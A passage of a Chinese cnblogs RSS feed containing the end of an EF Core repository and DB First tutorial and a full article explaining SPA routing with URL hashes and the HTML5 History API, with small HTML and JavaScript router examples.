&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;15&quot;&gt;
&lt;p&gt;&lt;strong&gt;在 Controller 里面调用并测试&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BlogsController : ControllerBase
{
    private readonly IBlogggingRepositoryBase&amp;lt;Blog, int&amp;gt; _blogRepository;
    private readonly IBlogggingRepositoryBase&amp;lt;Post, int&amp;gt; _postRepository;
    private readonly BloggingUnitOfWork _unitOfWork;

    public BlogsController(IBlogggingRepositoryBase&amp;lt;Blog, int&amp;gt; blogRepository, IBlogggingRepositoryBase&amp;lt;Post, int&amp;gt; postRepository, BloggingUnitOfWork unitOfWork)
    {
        _blogRepository = blogRepository;
        _postRepository = postRepository;
        _unitOfWork = unitOfWork;
    }

    [HttpGet]
    public async Task&amp;lt;IActionResult&amp;gt; GetBlogs()
    {
        var blogs = await _blogRepository.GetAsync();
        return Ok(blogs);
    }

    [HttpPost]
    public async Task&amp;lt;IActionResult&amp;gt; PostBlog([FromBody] Blog blog)
    {
        if (!ModelState.IsValid)
        {
            return BadRequest(ModelState);
        }

        //await _blogRepository.AddAsync(new Blog { Url = &quot;http://sample.com/4&quot;, Rating = 0 });
        //await _postRepository.AddAsync(new Post { Title = &quot;Title4&quot;, Content = &quot;BlogId_1 Post_3&quot;, BlogId = 1 });

        var result = await _blogRepository.AddAsync(blog);
        await _unitOfWork.SaveChangesAsync();

        return CreatedAtAction(&quot;GetBlog&quot;, new { id = blog.Id }, blog);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;EF Core 的 DB First 是通过 &lt;code&gt;Scaffold-DbContext&lt;/code&gt; 命令根据已经存在的数据库创建实体类和context类。&lt;/p&gt;
&lt;p&gt;可以通过&lt;code&gt;PM&amp;gt; get-help scaffold-dbcontext –detailed&lt;/code&gt;查看命令的详细参数&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Scaffold-DbContext [-Connection] &amp;lt;String&amp;gt; [-Provider] &amp;lt;String&amp;gt; [-OutputDir &amp;lt;String&amp;gt;] [-ContextDir &amp;lt;String&amp;gt;] [-Context &amp;lt;String&amp;gt;] [-Schemas &amp;lt;String[]&amp;gt;] [-Tables &amp;lt;String[]&amp;gt;] [-DataAnnotations] [-UseDatabaseNames] [-Force] 
[-Project &amp;lt;String&amp;gt;] [-StartupProject &amp;lt;String&amp;gt;] [&amp;lt;CommonParameters&amp;gt;]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用之前创建的 blogging 数据库简单的测试一下：&lt;/p&gt;
&lt;ol readability=&quot;1&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;新建一个项目，然后通过 Nuget 安装 EF Core 引用&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Install-Package Microsoft.EntityFrameworkCore.SqlServer
Install-Package Microsoft.EntityFrameworkCore.Tools&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;执行命令创建实体&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Scaffold-DbContext &quot;Server=CD02SZV3600503\SQLEXPRESS;Database=BloggingWithRepository;Trusted_Connection=True;&quot; Microsoft.EntityFrameworkCore.SqlServer -OutputDir Models&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;执行成功后可以看到在 Models 文件夹下面创建的实体类和 Context 类。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/zdz72113/NETCore_BasicKnowledge.Examples/tree/master/ORMDemo&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考&lt;/p&gt;
</description>
<pubDate>Fri, 21 Sep 2018 07:15:00 +0000</pubDate>
<dc:creator>车骑</dc:creator>
<og:description>[TOC] EF Core 简介 Entity Framework Core 是微软自家的 ORM 框架。作为 .Net Core 生态中的一个重要组成部分，它是一个支持跨平台的全新版本，用三个词来概</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/royzshare/p/9686706.html</dc:identifier>
</item>
<item>
<title>SPA路由机制详解（看不懂不要钱~~） - 梁音</title>
<link>http://www.cnblogs.com/liangyin/p/9686696.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liangyin/p/9686696.html</guid>
<description>&lt;hr/&gt;&lt;hr/&gt;
&lt;p&gt;总所周知，随着前端应用的业务功能起来越复杂，用户对于使用体验的要求越来越高，单面（&lt;code&gt;SPA&lt;/code&gt;）成为前端应用的主流形式。而大型单页应用最显著特点之一就是采用的前端路由跳转子页面系统，通过改变页面的&lt;code&gt;URL&lt;/code&gt;，在不重新请求页面的情况下，更新页面视图。&lt;/p&gt;
&lt;p&gt;更新视图但是浏览器不重新渲染整个页面，只是重新渲染部分子页面，加载速度快，页面反应灵活，这是 &lt;code&gt;SPA&lt;/code&gt; 的优势，这也是前端路由原理的核心，这会给人一种仿佛在操作 &lt;code&gt;APP&lt;/code&gt; 一样的感觉，目前在浏览器环境中实现这一功能的方式主要有两种：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;利用 &lt;code&gt;URL&lt;/code&gt; 的 &lt;code&gt;hash(#)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;利用 &lt;code&gt;H5&lt;/code&gt; 新增方法 &lt;code&gt;History interface&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 &lt;code&gt;H5&lt;/code&gt; 还没有流行开来时，一般 &lt;code&gt;SPA&lt;/code&gt; 都采用 &lt;code&gt;url&lt;/code&gt; 的 &lt;code&gt;hash(#)&lt;/code&gt; 作为锚点，获取到 # 之后的值，并监听其改变，再进行渲染对应的子页面。&lt;a href=&quot;https://music.163.com/&quot;&gt;网易云音乐官网&lt;/a&gt;就是利用的此技术。&lt;/p&gt;
&lt;p&gt;例如，你的地址为&lt;code&gt;http://localhost:8888/#/abc&lt;/code&gt; 那么利用 &lt;code&gt;location.hash&lt;/code&gt; 输出的内容就为 &lt;code&gt;#/abc&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;那么我就先从 &lt;code&gt;location&lt;/code&gt; 这个对象说起。&lt;/p&gt;
&lt;p&gt;先来看看&lt;code&gt;location&lt;/code&gt;的官方属性有哪些&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;8&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;hash&lt;/td&gt;
&lt;td&gt;设置或返回从 # 开始的 URL （锚）&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;host&lt;/td&gt;
&lt;td&gt;设置或返回主机名和当前 URL 的端口号&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;hostname&lt;/td&gt;
&lt;td&gt;设置或返回当前 URL 的主机名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;href&lt;/td&gt;
&lt;td&gt;设置或返回完整的 URL&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;pathname&lt;/td&gt;
&lt;td&gt;设置或返回当前 URL 的路径部分&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;port&lt;/td&gt;
&lt;td&gt;设置或返回当前 URL 的端口号&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;protocol&lt;/td&gt;
&lt;td&gt;设置或返回当前 URL 的协议&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;search&lt;/td&gt;
&lt;td&gt;设置或返回从 ? 开始的 URL 部分&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;由上表格可以知道，我们可以轻易的获取到 # 之后的部分，那么拿到这个部分我们怎么监听其变化以及对应的子页面进行改变呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt; 对象中有一个事件是专门监听&lt;code&gt;hash&lt;/code&gt;的变化，那就是&lt;code&gt;onhashchange&lt;/code&gt;，首先我们需要监听此事件：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;body&amp;gt;
  &amp;lt;h1 id=&quot;id&quot;&amp;gt;&amp;lt;/h1&amp;gt;
  &amp;lt;a href=&quot;#/id1&quot;&amp;gt;id1&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id2&quot;&amp;gt;id2&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id3&quot;&amp;gt;id3&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;script&amp;gt;
  window.addEventListener('hashchange', e =&amp;gt; {
    e.preventDefault()
    document.querySelector('#id').innerHTML = location.hash
  })
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/yinLiangDream/md/blob/master/SPA%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3.assets/Jietu20180920-143640-HD.gif?raw=true&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可见此时我们已经完全监听到了 &lt;code&gt;URL&lt;/code&gt; 的变化，页面上的内容也对应改变了。&lt;br/&gt;那么，该如何载入不同的页面呢，目前来说有三种方式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;寻找节点内容并改变（也就是上面我们演示的内容）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;import&lt;/code&gt; 一个 &lt;code&gt;JS&lt;/code&gt; 文件，文件内部 &lt;code&gt;export&lt;/code&gt; 模版字符串&lt;/li&gt;
&lt;li&gt;利用 &lt;code&gt;AJAX&lt;/code&gt; 加载对应的 &lt;code&gt;HTML&lt;/code&gt; 模版&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;第一种方式已经演示过，不过这种方式局限性太大，下面我会演示另外两种方式加载页面。&lt;/p&gt;
&lt;h2 id=&quot;import-方式&quot;&gt;&lt;code&gt;import&lt;/code&gt; 方式&lt;/h2&gt;
&lt;p&gt;定义一个 &lt;code&gt;JS&lt;/code&gt; 文件，名为 &lt;code&gt;demo1.js&lt;/code&gt;，在里面输入内容：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;const str = `
  &amp;lt;div&amp;gt;
    我是import进来的JS文件
  &amp;lt;/div&amp;gt;
`
export default str&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在主文件里 &lt;code&gt;import&lt;/code&gt; 进来，并进行测试(使用 &lt;code&gt;Chrome&lt;/code&gt; 一定要使用服务器开启，或者直接用火狐打开）：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;body&amp;gt;
  &amp;lt;h1 id=&quot;id&quot;&amp;gt;&amp;lt;/h1&amp;gt;
  &amp;lt;a href=&quot;#/id1&quot;&amp;gt;id1&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id2&quot;&amp;gt;id2&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id3&quot;&amp;gt;id3&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;!-- 在 HTML 导入文件记得要加上 type=&quot;module&quot; --&amp;gt;
&amp;lt;script type=&quot;module&quot;&amp;gt;
  import demo1 from './demo1.js'
  document.querySelector('#id').innerHTML = demo1
  window.addEventListener('hashchange', e =&amp;gt; {
    e.preventDefault()
    document.querySelector('#id').innerHTML = location.hash
  })
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/yinLiangDream/md/blob/master/SPA%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3.assets/Jietu20180920-163024@2x.jpg?raw=true&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可见导入文件已经生效，目前大部分框架编译过后是采用类似此种方式处理。&lt;/p&gt;
&lt;p&gt;例如，&lt;code&gt;vue&lt;/code&gt; 框架，&lt;code&gt;.vue&lt;/code&gt; 文件是一个自定义的文件类型，用类 &lt;code&gt;HTML&lt;/code&gt; 语法描述一个 &lt;code&gt;Vue&lt;/code&gt; 组件。每个 &lt;code&gt;.vue&lt;/code&gt; 文件包含三种类型的顶级语言块 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt;， &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 和 &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;，&lt;code&gt;vue-loader&lt;/code&gt; 会解析文件，提取每个语言块，如有必要会通过其它 &lt;code&gt;loader&lt;/code&gt; 处理，最后将他们组装成一个 &lt;code&gt;CommonJS&lt;/code&gt; 模块，&lt;code&gt;module.exports&lt;/code&gt; 出一个 &lt;code&gt;Vue.js&lt;/code&gt; 组件对象。。&lt;/p&gt;
&lt;h2 id=&quot;ajax-方式&quot;&gt;&lt;code&gt;AJAX&lt;/code&gt; 方式&lt;/h2&gt;
&lt;p&gt;本篇文章是详解路由机制，&lt;code&gt;AJAX&lt;/code&gt; 就直接采用 &lt;code&gt;JQuery&lt;/code&gt; 这个轮子。&lt;/p&gt;
&lt;p&gt;定义一个 &lt;code&gt;HTML&lt;/code&gt; 文件，名为 &lt;code&gt;demo2.html&lt;/code&gt;，在里面写入一些内容（由于主页面已经有&lt;code&gt;head&lt;/code&gt;，&lt;code&gt;body&lt;/code&gt;等根标签，此文件只需写入需要替换的标签）：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;div&amp;gt;
  我是AJAX加载进来的HTML文件
&amp;lt;/div&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们在主文件里写入，并进行测试：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;body&amp;gt;
  &amp;lt;h1 id=&quot;id&quot;&amp;gt;&amp;lt;/h1&amp;gt;
  &amp;lt;a href=&quot;#/id1&quot;&amp;gt;id1&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id2&quot;&amp;gt;id2&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id3&quot;&amp;gt;id3&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script type=&quot;module&quot;&amp;gt;
  // import demo1 from './demo1.js'
  // document.querySelector('#id').innerHTML = demo1
  $.ajax({
    url: './demo2.html',
    success: (res) =&amp;gt; {
      document.querySelector('#id').innerHTML = res
    }
  })
  window.addEventListener('hashchange', e =&amp;gt; {
    e.preventDefault()
    document.querySelector('#id').innerHTML = location.hash
  })
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/yinLiangDream/md/blob/master/SPA%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3.assets/Jietu20180920-170239.jpg?raw=true&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可见，利用 &lt;code&gt;AJAX&lt;/code&gt; 加载进来的文件也已经生效。&lt;/p&gt;
&lt;p&gt;既然加载不同页面的内容都已经生效，那么只需要包装一下我们的监听，利用观察者模式封装路由的变化：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;body&amp;gt;
  &amp;lt;h1 id=&quot;id&quot;&amp;gt;我是空白页&amp;lt;/h1&amp;gt;
  &amp;lt;a href=&quot;#/id1&quot;&amp;gt;id1&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id2&quot;&amp;gt;id2&amp;lt;/a&amp;gt;
  &amp;lt;a href=&quot;#/id3&quot;&amp;gt;id3&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script type=&quot;module&quot;&amp;gt;
  import demo1 from './demo1.js'
  // 创建一个 newRouter 类
  class newRouter {
    // 初始化路由信息
    constructor() {
      this.routes = {};
      this.currentUrl = '';
    }
    // 传入 URL 以及 根据 URL 对应的回调函数
    route(path, callback = () =&amp;gt; {}) {
      this.routes[path] = callback;
    }
    // 切割 hash，渲染页面
    refresh() {
      this.currentUrl = location.hash.slice(1) || '/';
      this.routes[this.currentUrl] &amp;amp;&amp;amp; this.routes[this.currentUrl]();
    }
    // 初始化
    init() {
      window.addEventListener('load', this.refresh.bind(this), false);
      window.addEventListener('hashchange', this.refresh.bind(this), false);
    }
  }
  // new 一个 Router 实例
  window.Router = new newRouter();
  // 路由实例初始化
  window.Router.init();

  // 获取关键节点
  var content = document.querySelector('#id');

  Router.route('/id1', () =&amp;gt; {
    content.innerHTML = 'id1'
  });
  Router.route('/id2', () =&amp;gt; {
    content.innerHTML = demo1
  });
  Router.route('/id3', () =&amp;gt; {
    $.ajax({
      url: './demo2.html',
      success: (res) =&amp;gt; {
        content.innerHTML = res
      }
    })
  });
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/yinLiangDream/md/blob/master/SPA%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3.assets/Jietu20180920-174708-HD.gif?raw=true&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，利用 &lt;code&gt;hash(#)&lt;/code&gt; 进行前端路由管理都已实现。&lt;/p&gt;

&lt;p&gt;上面使用的 &lt;code&gt;hash&lt;/code&gt; 法实现路由固然不错，但是问题就是实在太丑~ 如果在微信或者其他不显示 &lt;code&gt;URL&lt;/code&gt; 的 &lt;code&gt;APP&lt;/code&gt; 中使用，倒也无所谓，但是如果在一般的浏览器中使用就会遇到问题了。&lt;/p&gt;
&lt;p&gt;由此，&lt;code&gt;H5&lt;/code&gt; 的 &lt;code&gt;History&lt;/code&gt; 模式，解决了这一问题。&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;H5&lt;/code&gt; 之前， &lt;code&gt;History&lt;/code&gt; 仅仅只有一下几个 &lt;code&gt;API&lt;/code&gt;：&lt;br/&gt;|API|说明|&lt;br/&gt;|:-:|:-:|&lt;br/&gt;|&lt;code&gt;back()&lt;/code&gt;|回退到上次访问的 &lt;code&gt;URL&lt;/code&gt; （与浏览器点击后退按钮相同）|&lt;br/&gt;|&lt;code&gt;forward()&lt;/code&gt;|前进到回退之前的 &lt;code&gt;URL&lt;/code&gt; （与浏览器点击向前按钮相同）|&lt;br/&gt;|&lt;code&gt;go(n)&lt;/code&gt;|&lt;code&gt;n&lt;/code&gt; 接收一个整数，移动到该整数指定的页面，比如&lt;code&gt;go(1)&lt;/code&gt;相当于&lt;code&gt;forward()&lt;/code&gt;，&lt;code&gt;go(-1)&lt;/code&gt; 相当于 &lt;code&gt;back()&lt;/code&gt;，&lt;code&gt;go(0)&lt;/code&gt;相当于刷新当前页面|&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果移动的位置超出了访问历史的边界，以上三个方法并不报错，而是静默失败。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然而，到了 &lt;code&gt;H5&lt;/code&gt; 的时代，新的 &lt;code&gt;H5&lt;/code&gt; 则赋予了其更多的新特性：&lt;/p&gt;
&lt;h2 id=&quot;往返缓存&quot;&gt;往返缓存&lt;/h2&gt;
&lt;p&gt;默认情况下，浏览器会缓存当前会话页面，这样当下一个页面点击后退按钮，或前一个页面点击前进按钮，浏览器便会从缓存中提取并加载此页面，这个特性被称为“往返缓存”。&lt;/p&gt;
&lt;p&gt;PS: 此缓存会保留页面数据、DOM和js状态，实际上是将整个页面完好无缺地保留。&lt;/p&gt;
&lt;h2 id=&quot;往历史记录栈中添加记录pushstatestate-title-url&quot;&gt;往历史记录栈中添加记录：pushState(state, title, url)&lt;/h2&gt;
&lt;p&gt;浏览器支持度: &lt;code&gt;IE10+&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;state: 一个 &lt;code&gt;JS&lt;/code&gt; 对象（不大于640kB），主要用于在 &lt;code&gt;popstate&lt;/code&gt; 事件中作为参数被获取。如果不需要这个对象，此处可以填 &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;title: 新页面的标题，部分浏览器(比如 Firefox )忽略此参数，因此一般为 &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;url: 新历史记录的地址，&lt;strong&gt;可为页面地址，也可为一个锚点值&lt;/strong&gt;，新 &lt;code&gt;url&lt;/code&gt; 必须与当前 &lt;code&gt;url&lt;/code&gt; 处于同一个域，否则将抛出异常，此参数若没有特别标注，会被设为当前文档 &lt;code&gt;url&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;栗子：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;// 现在是 localhost/1.html
const stateObj = { foo: 'bar' };
history.pushState(stateObj, 'page 2', '2.html');

// 浏览器地址栏将立即变成 localhost/2.html
// 但！！！
// 不会跳转到 2.html
// 不会检查 2.html 是否存在
// 不会在 popstate 事件中获取
// 不会触发页面刷新

// 这个方法仅仅是添加了一条最新记录&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;除此之外，仍有几点需要注意：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;将 &lt;code&gt;url&lt;/code&gt; 设为锚点值时不会触发 &lt;code&gt;hashchange&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;根据同源策略，如果设置&lt;strong&gt;不同&lt;/strong&gt;域名地址，会报错，这样做的目的是：防止用户以为它们是同一个网站，若没有此限制，将很容易进行 &lt;code&gt;XSS&lt;/code&gt; 、 &lt;code&gt;CSRF&lt;/code&gt; 等攻击方式&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;改变当前的历史记录replacestatestate-title-url&quot;&gt;改变当前的历史记录：replaceState(state, title, url)&lt;/h2&gt;
&lt;p&gt;浏览器支持度: &lt;code&gt;IE10+&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;参数含义同 &lt;code&gt;pushstate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;改变当前的历史记录而不是添加新的记录&lt;/li&gt;
&lt;li&gt;同样不会触发 &lt;code&gt;popstate&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;history.state&quot;&gt;history.state&lt;/h2&gt;
&lt;p&gt;浏览器支持度: &lt;code&gt;IE10+&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;返回当前历史记录的 &lt;code&gt;state&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;popstate&quot;&gt;popstate&lt;/h2&gt;
&lt;p&gt;定义：每当同一个文档的浏览历史（即 &lt;code&gt;history&lt;/code&gt; 对象）出现变化时，就会触发 &lt;code&gt;popstate&lt;/code&gt; 事件。&lt;/p&gt;
&lt;p&gt;注意：若仅仅调用 &lt;code&gt;pushState&lt;/code&gt; 方法或 &lt;code&gt;replaceState&lt;/code&gt; 方法 ，并不会触发该事件，只有用户点击浏览器&lt;strong&gt;倒退&lt;/strong&gt;按钮和&lt;strong&gt;前进&lt;/strong&gt;按钮，或者使用 &lt;code&gt;JavaScript&lt;/code&gt; 调用 &lt;code&gt;back&lt;/code&gt; 、 &lt;code&gt;forward&lt;/code&gt; 、 &lt;code&gt;go&lt;/code&gt; 方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。&lt;/p&gt;
&lt;p&gt;栗子：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;window.onpopstate= (event) =&amp;gt; {
　　console.log(event.state) //当前历史记录的state对象
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;实现&quot;&gt;实现&lt;/h2&gt;
&lt;p&gt;了解了这么多内容，那么就让我们开始实现 &lt;code&gt;History&lt;/code&gt; 模式的路由吧！&lt;/p&gt;
&lt;p&gt;我们将上面的 &lt;code&gt;HTML&lt;/code&gt; 稍稍改造下，请大家耐心分析：&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;body&amp;gt;
  &amp;lt;h1 id=&quot;id&quot;&amp;gt;我是空白页&amp;lt;/h1&amp;gt;
  &amp;lt;a class=&quot;route&quot; href=&quot;/id1&quot;&amp;gt;id1&amp;lt;/a&amp;gt;
  &amp;lt;a class=&quot;route&quot; href=&quot;/id2&quot;&amp;gt;id2&amp;lt;/a&amp;gt;
  &amp;lt;a class=&quot;route&quot; href=&quot;/id3&quot;&amp;gt;id3&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;import demo1 from './demo1.js'
  // 创建一个 newRouter 类
  class newRouter {
    // 初始化路由信息
    constructor() {
      this.routes = {};
      this.currentUrl = '';
    }
    route(path, callback) {
      this.routes[path] = (type) =&amp;gt; {
        if (type === 1) history.pushState( { path }, path, path );
        if (type === 2) history.replaceState( { path }, path, path );
        callback()
      };
    }
    refresh(path, type) {
      this.routes[this.currentUrl] &amp;amp;&amp;amp; this.routes[this.currentUrl](type);
    }
    init() {
      window.addEventListener('load', () =&amp;gt; {
        // 获取当前 URL 路径
        this.currentUrl = location.href.slice(location.href.indexOf('/', 8))
        this.refresh(this.currentUrl, 2)
      }, false);
      window.addEventListener('popstate', () =&amp;gt; {
        this.currentUrl = history.state.path
        this.refresh(this.currentUrl, 2)
      }, false);
      const links = document.querySelectorAll('.route')
      links.forEach((item) =&amp;gt; {
        // 覆盖 a 标签的 click 事件，防止默认跳转行为
        item.onclick = (e) =&amp;gt; {
          e.preventDefault()
          // 获取修改之后的 URL
          this.currentUrl = e.target.getAttribute('href')
          // 渲染
          this.refresh(this.currentUrl, 2)
        }
      })
    }
  }
  // new 一个 Router 实例
  window.Router = new newRouter();
  // 实例初始化
  window.Router.init();

  // 获取关键节点
  var content = document.querySelector('#id');

  Router.route('/id1', () =&amp;gt; {
    content.innerHTML = 'id1'
  });
  Router.route('/id2', () =&amp;gt; {
    content.innerHTML = demo1
  });
  Router.route('/id3', () =&amp;gt; {
    $.ajax({
      url: './demo2.html',
      success: (res) =&amp;gt; {
        content.innerHTML = res
      }
    })
  });&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;演示图如下所示：&lt;br/&gt;&lt;img src=&quot;https://github.com/yinLiangDream/md/blob/master/SPA%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3.assets/QQ20180921-093858-HD.gif?raw=true&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;

&lt;p&gt;一般场景下，&lt;code&gt;hash&lt;/code&gt; 和 &lt;code&gt;history&lt;/code&gt; 都可以，除非你更在意颜值，&lt;code&gt;#&lt;/code&gt; 符号夹杂在 &lt;code&gt;URL&lt;/code&gt; 里看起来确实有些不太美丽。&lt;br/&gt;另外，根据 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web&quot;&gt;Mozilla Develop Network&lt;/a&gt; 的介绍，调用 &lt;code&gt;history.pushState()&lt;/code&gt; 相比于直接修改 &lt;code&gt;hash&lt;/code&gt;，存在以下优势：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;pushState()&lt;/code&gt; 设置的新 &lt;code&gt;URL&lt;/code&gt; 可以是与当前 &lt;code&gt;URL&lt;/code&gt; 同源的任意 &lt;code&gt;URL&lt;/code&gt;；而 &lt;code&gt;hash&lt;/code&gt; 只可修改 &lt;code&gt;#&lt;/code&gt; 后面的部分，因此只能设置与当前 &lt;code&gt;URL&lt;/code&gt; 同文档的 &lt;code&gt;URL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pushState()&lt;/code&gt; 设置的新 &lt;code&gt;URL&lt;/code&gt; 可以与当前 &lt;code&gt;URL&lt;/code&gt; 一模一样，这样也会把记录添加到栈中；而 &lt;code&gt;hash&lt;/code&gt; 设置的新值必须与原来不一样才会触发动作将记录添加到栈中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pushState()&lt;/code&gt; 通过 &lt;code&gt;stateObject&lt;/code&gt; 参数可以添加任意类型的数据到记录中；而 &lt;code&gt;hash&lt;/code&gt; 只可添加短字符串；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pushState()&lt;/code&gt; 可额外设置 &lt;code&gt;title&lt;/code&gt; 属性供后续使用。&lt;/li&gt;
